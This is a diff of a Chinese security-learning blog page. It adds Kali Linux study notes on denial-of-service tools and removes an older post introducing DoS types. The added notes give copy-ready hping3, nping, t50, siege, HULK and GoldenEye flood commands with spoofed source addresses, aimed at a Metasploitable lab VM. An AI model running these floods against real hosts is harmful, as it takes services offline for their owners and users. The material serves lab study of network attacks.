@@ -240,6 +240,463 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/" itemprop="url">Kali Linux笔记(八十七)：DoS工具包</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T15:57:51+08:00">
+                2020-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-拒绝服务攻击工具"><a href="#1-拒绝服务攻击工具" class="headerlink" title="1. 拒绝服务攻击工具"></a>1. 拒绝服务攻击工具</h4><ul>
+<li>RUDY<ul>
+<li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li>
+<li>▲ 与slowhttptest的区别：每次只传输一个字节的数据</li>
+<li>▲ 攻击有表单WEB页面，攻击时需指定攻击的参数名称</li>
+<li>美剧”黑客军团”中曾提到此攻击手段</li>
+<li><a href="http://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">http://sourceforge.net/projects/r-u-dead-yet/</a></li>
+</ul>
+</li>
+<li>Hping3<ul>
+<li>几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试</li>
+<li>参数<ul>
+<li>-c（建立的连接数）</li>
+<li>-d（发送的数据包要有多大）</li>
+<li>-S（Syn Flood攻击）</li>
+<li>-w（window大小，默认为64字节）</li>
+<li>-p（目标端口）</li>
+<li>–rand-source（随机产生源地址）</li>
+<li>-P/-U（TCP标记位PSH/URG）</li>
+<li>-q（不显示攻击结果）</li>
+<li>-a（伪造源地址）</li>
+<li>-n（不解析域名）</li>
+<li>-s（指定源端口）</li>
+</ul>
+</li>
+<li>Syn Flood攻击<ul>
+<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood</code></strong> –rand-source 1.1.1.1</li>
+<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>TCP Flood攻击     <ul>
+<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>ICMP Flood攻击<ul>
+<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2</code></strong></li>
+</ul>
+</li>
+<li>UDP Flood攻击<ul>
+<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2</code></strong></li>
+</ul>
+</li>
+<li>LAND攻击<ul>
+<li>特殊种类的SYN FLood攻击</li>
+<li>源地址、目的地址都是受害者，受害者于自己完成三次握手</li>
+<li><strong><code>🔺命令：hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>nping<ul>
+<li>TCP全链接DoS攻击<ul>
+<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>查公网IP<ul>
+<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Siege<ul>
+<li>http/https压力测试工具，模拟多个用户并发访问请求</li>
+<li><strong><code>🔺命令：siege -g http://1.1.1.1/a.php / 1.1.1.1</code></strong> </li>
+<li><strong><code>🔺命令：siege -i -c 1000</code></strong></li>
+<li><strong><code>🔺命令：siege -i -c 1000 http://1.1.1.1/a.php -A siegehttp</code></strong></li>
+<li>同时攻击多个url，使用-f调用字典文件<ul>
+<li>/etc/siege/urls.txt </li>
+</ul>
+</li>
+</ul>
+</li>
+<li>T50网络压力测试<ul>
+<li>▲ t50 -h（t50命令详细）</li>
+<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80</code></strong> </li>
+<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
+</ul>
+</li>
+<li>Nmap<ul>
+<li><strong><code>🔺命令：grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2</code></strong></li>
+<li><strong><code>🔺命令：cat /usr/share/nmap/scripts/script.db</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="2-匿名者拒绝服务工具包"><a href="#2-匿名者拒绝服务工具包" class="headerlink" title="2. 匿名者拒绝服务工具包"></a>2. 匿名者拒绝服务工具包</h4><ul>
+<li>匿名者发布的DoS工具<ul>
+<li>LOIC</li>
+<li>HOIC</li>
+<li>DDoSer</li>
+</ul>
+</li>
+<li>招募志愿者发放以上工具</li>
+<li>以上DoS工具不隐藏真实IP地址</li>
+<li>▲ 选取消耗系统资源更大的页面</li>
+</ul>
+<h4 id="3-其他拒绝服务工具"><a href="#3-其他拒绝服务工具" class="headerlink" title="3. 其他拒绝服务工具"></a>3. 其他拒绝服务工具</h4><ul>
+<li>XOIC<ul>
+<li>攻击任意IP地址的指定端口</li>
+<li><strong><code>🔺命令：git clone git://git.code.sf.net/p/xoic/code xoic-code</code></strong> </li>
+<li><a href="https://xoicdoser.wordpress.com/" target="_blank" rel="noopener">https://xoicdoser.wordpress.com/</a></li>
+<li>三种模式：test、normal、DoS Attack</li>
+<li>支持协议：TCP/HTTP/UDP/ICMP</li>
+<li>▲ 数据包难以找到/软件包带有恶意软件</li>
+</ul>
+</li>
+<li>HULK–Http Unbearable Load King<ul>
+<li>Python脚本</li>
+<li>随机产生大量唯一的地址请求，避免缓存命中（▲ 对企业有nginx等反向代理软件）</li>
+<li>耗尽WEB服务器资源池</li>
+<li><a href="https://packetstormsecurity.com/files/download/112856/hulk.zip" target="_blank" rel="noopener">https://packetstormsecurity.com/files/download/112856/hulk.zip</a></li>
+</ul>
+</li>
+<li>DDoSIM<ul>
+<li>7层拒绝服务工具（模拟多个僵尸机）</li>
+<li>随机IP地址</li>
+<li>基于TCP连接的攻击</li>
+<li>应用层DDoS攻击</li>
+<li>正常的HTTP请求、非正常的HTTP请求式DDoS</li>
+<li>SMTP DDoS</li>
+<li>随机端口的TCP连接洪水</li>
+<li>▲ 数据包难以找到/软件包带有恶意软件</li>
+<li>▲ 2020.2.13 找到此工具后无法编译</li>
+</ul>
+</li>
+<li>GoldenEye<ul>
+<li>http/https拒绝服务攻击工具</li>
+<li>安全研究位目的的Python脚本</li>
+<li>随机攻击向量，keep-alive，避免缓存命中</li>
+<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
+<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
+<li><strong><code>🔺命令：./goldeneye.py -h</code></strong>（▲ 查看goldeneye选项）</li>
+<li><strong><code>🔺命令：./goldeneye.py http://1.1.1.1 -w 50</code></strong></li>
+<li>▲ -w（僵尸机）</li>
+<li>▲ 2020.2.13 此工具运行后抓包无发生数据</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0145gE5wtPPVUhL8XXRl868QS9C_7JodUhFbisUR9vzy2Iekbrj5sJO3Bq6c_Wu9hGzqBB_BKnTKYWmV9du3bgB_99YpZjhnccmZMUPNGMDsEbW-bw&file_name=/XOIC.PNG" alt="XOIC"></p>
+<h4 id="4-实验–RUDY"><a href="#4-实验–RUDY" class="headerlink" title="4. 实验–RUDY"></a>4. 实验–RUDY</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>物理机上拷贝下载的RUDY文件，进行解压查看，可以修改配置文件rudeadyet.conf</li>
+<li>浏览器访问Metasploit尝试连接，找出表单对应的变量名称</li>
+<li>修改配置文件rudeadyet.conf（URL、attack_parameters）</li>
+<li><strong><code>🔺命令：./r-u-dead-yet-v2.2.py</code></strong></li>
+<li>可通过Wireshark抓包，查看发送的数据包（TCP segement byte是否为一个字节）</li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=f951l0uyfrfspIYoEovNh8JiJ2YhGEs5csqy_g7RDofyQr951iX7tB5H9fuIK2NEZMABOF47-qKH1UgDjJITYpuWX2pYhW6B9HYUgDGQMK4EiVXUMiX8aOJfrA&file_name=/rudy%E6%94%BB%E5%87%BB.PNG" alt="Rudy攻击"></p>
+<h4 id="5-实验–hping3"><a href="#5-实验–hping3" class="headerlink" title="5. 实验–hping3"></a>5. 实验–hping3</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -a Metasploit的IP -S -d 100 -p 80 --flood Metasploit的IP</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-实验–nping"><a href="#6-实验–nping" class="headerlink" title="6. 实验–nping"></a>6. 实验–nping</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-实验–siege"><a href="#7-实验–siege" class="headerlink" title="7. 实验–siege"></a>7. 实验–siege</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：siege -g http://Metasploit的IP/a.php / Metasploit的IP</code></strong>（查看banner信息）</li>
+<li><strong><code>🔺命令：siege -i（互联网形式） -c 1000 http://Metasploit的IP/a.php -A（user-agent） siegehttp</code></strong></li>
+<li><strong><code>🔺命令：siege -i -c 1000</code></strong>（去默认文件夹寻找URL地址）</li>
+<li>可通过Wireshark抓包，查看发送的数据包</li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-实验–t50"><a href="#8-实验–t50" class="headerlink" title="8. 实验–t50"></a>8. 实验–t50</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig查看IP地址</code></strong></li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：t50 Metasploit的IP --flood --turbo -S --protocol TCP --dport 80</code></strong></li>
+<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-实验–匿名者拒绝服务工具包"><a href="#9-实验–匿名者拒绝服务工具包" class="headerlink" title="9. 实验–匿名者拒绝服务工具包"></a>9. 实验–匿名者拒绝服务工具包</h4><ul>
+<li>▲ 工具包都为.exe文件，所以可能无法在Kali上运行（即使有mono界面/wine程序）</li>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>使用LOIC攻击进行尝试，浏览器访问Metasploit尝试连接（更改Attack options进行尝试）</li>
+<li>使用HOIC攻击进行尝试，浏览器访问Metasploit尝试连接（不要下载Booster）</li>
+<li>使用DDoSer攻击进行尝试，浏览器访问Metasploit尝试连接（字符界面）</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=7d26jTimjz2vgXii_bPcR4_P8BtE-e8OmqJwOeMI_ElfUn-qD4G3QS6um4B08BzjK_QY1idU2rVz0x8mfOh7EgKjqQ6VPHAP4QebxDkhYCokc0ijYg&file_name=/LOIC.PNG" alt="LOIC"></p>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=82fcdNouj3c_14RdAOZqSvvCV8NFBfHRY7fHVKGHbi1KiGYtEYItEih71Vt93720hD_lJU5NihHQnyVJGajzknqFfYMilYUde8iZ7Y0tu6_qsiWMaA&file_name=/HOIC.PNG" alt="HOIC"></p>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6ef5qTUXGYnIfkf1Hxhc9UZr5Vn0SG8iPZhjq3AXo_VCu9Terc0yhUVUwVHp1KE4biO8df0A6Hlcp0LmA_Xsj6kvexjXEuc3YdFM8Bjc-scwljPCc2-e&file_name=/DDoSer.PNG" alt="DDoSer"></p>
+<h4 id="10-实验–HULK"><a href="#10-实验–HULK" class="headerlink" title="10. 实验–HULK"></a>10. 实验–HULK</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>从物理机拷贝HULK工具</li>
+<li><strong><code>🔺命令：python hulk.py http://Metasploit的IP地址</code></strong></li>
+<li>开启Wireshark抓包，Fllow → TCP Stream 查看GET数据包情况（多个数据包分析）</li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=318cWujI2Ac8UmcXyCS7OeLXvX2ZzNa5q8Bee_XKEvwCcFf6Ncq9u21zpgayrWvLv6TuiBIJyvCrXiLb48hdJ3N3wypIomne2yFZnnKeJBj7vd6X2w&file_name=/HULK.PNG" alt="HULK"></p>
+<h4 id="11-实验–GoldenEye"><a href="#11-实验–GoldenEye" class="headerlink" title="11. 实验–GoldenEye"></a>11. 实验–GoldenEye</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
+<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
+<li><strong><code>🔺命令：./goldeneye.py http://Metasploit的IP地址 -w 50</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>开启Wireshark抓包，查看数据包</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=dc15B73PwwlawMt1L4zxDTbDFV5a9WqSXAWHtHo21SLvZ4phCvHlvKiwk7zwY5KShx0E0KxR1YnJ3q6A6lWneQ90-xtmBGY0hRyaDtwQGfZ9Vg4We2d6vyEj&file_name=/GoldenEye.PNG" alt="GoldenEye"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2495,258 +2952,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/" itemprop="url">Kali Linux笔记(七十七)：DoS介绍及分类</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T20:06:41+08:00">
-                2020-02-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  607 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-拒绝服务"><a href="#1-拒绝服务" class="headerlink" title="1. 拒绝服务"></a>1. 拒绝服务</h4><ul>
-<li>DoS不是DOS<ul>
-<li>利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务</li>
-</ul>
-</li>
-<li>DDoS分布式拒绝服务<ul>
-<li>一对一的攻击完全拼各自的资源，效果差</li>
-<li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li>
-</ul>
-</li>
-<li>历史<ul>
-<li>以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖）</li>
-<li>现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索）<ul>
-<li>电商网站被勒索，Bill gates僵尸程序</li>
-<li>贩卖和租用肉鸡已经称为黑产中重要的一部分</li>
-<li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Anonymous匿名者<ul>
-<li>世界最著名的黑客组织</li>
-<li>组织结构宽松，人员来自世界各地</li>
-<li>以DDoS攻击著称的无政府主义者</li>
-<li>亦正亦邪，攻击恐怖组织也攻击政府宗教机构</li>
-<li>近些年来涉足政治斗争</li>
-<li>成员露面时均带有Guy Fawkes面具</li>
-<li>最早的核心成员来自4chan图片社区</li>
-<li>惯常雇佣外围黑客成员发动DDoS</li>
-<li>口号：<ul>
-<li>We are Anonymous,We are a Legion,We do not forgive,We do not forget,<br>Expect us.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cc69C-pmvobPxOEeSXQbCu7gJ7XWfinlg5u1AO7r8LXCdjrpOKpgzl2iLn5eGfNYfC2gcQVdIavpZf1ypTF3DUoYHgckdPti8gFH4LNgwRizkij4x2f5tt3G&file_name=/%E5%8C%BF%E5%90%8D%E8%80%85.PNG" alt="Anonymous匿名者"></p>
-<h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2. DoS分类"></a>2. DoS分类</h4><ul>
-<li>D网络<ul>
-<li>基于巨量的Flood耗尽目标网络带宽资源（打掉服务器的出口带宽）</li>
-<li>ICMP Flood、UDP Flood</li>
-</ul>
-</li>
-<li>D协议<ul>
-<li>攻击协议漏洞发起的拒绝服务攻击</li>
-<li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL</li>
-<li>▲ Syn → Syn/Ack → ACK（服务器一直等待最后的ACK导致DoS）</li>
-<li>▲ ARP（基于传闻的协议，发送即被接受）</li>
-</ul>
-</li>
-<li>D应用<ul>
-<li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li>
-<li>大量频繁访问消耗系统资源严重的应用（CC）</li>
-<li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li>
-<li>可以是一击毙命的，也可以是耗尽目标资源的</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-为何被DoS"><a href="#3-为何被DoS" class="headerlink" title="3. 为何被DoS"></a>3. 为何被DoS</h4><ul>
-<li>从攻击者到被害者<ul>
-<li>网络（网络设备等）→ FireWall → 服务器OS → 服务应用</li>
-</ul>
-</li>
-<li>资源耗尽<ul>
-<li>网络：带宽</li>
-<li>Firewall：吞吐量、并发连接</li>
-<li>服务器：CPU、内存、I/O</li>
-<li>应用：处理请求能力、对OS资源的使用权</li>
-</ul>
-</li>
-<li>程序漏洞攻击<ul>
-<li>缓冲区溢出</li>
-<li>协议、程序逻辑漏洞</li>
-</ul>
-</li>
-<li>链路上任何一点都可成为目标</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=abc2y5RcuHZuXlXIOBS6HhY1tgLVCry_GYF-1wxkzVe5gI3gjwRkLoVJzfKNv3Qkicb0ycN2gnU4ADne6Tu97uyzBGNQNskMioWKdLVXV1PeBDpblInx2Lvj&file_name=/Dos%E9%93%BE%E8%B7%AF.PNG" alt="DoS链路"></p>
-<h4 id="4-DDoS分类方法"><a href="#4-DDoS分类方法" class="headerlink" title="4. DDoS分类方法"></a>4. DDoS分类方法</h4><p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=60c2T5xZxwJxsYvT3Ae2wYbDxYXkIh92SmJnFPU_uKvtTgxMZz9MwQTQIUKjzqs3SGN4NGQIrn5C2q7ZF5FfJEDZ3KH0MjMQMjpiGxM6j5lf5TA7rPQ5bLWZPQ&file_name=/DDoS%E5%88%86%E7%B1%BB.PNG" alt="DDoS分类方法"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2801,7 +3006,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">133</span>
+                  <span class="site-state-item-count">134</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2908,7 +3113,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">118.7k</span>
+    <span title="Site words total count">119.3k</span>
   
 </div>
 
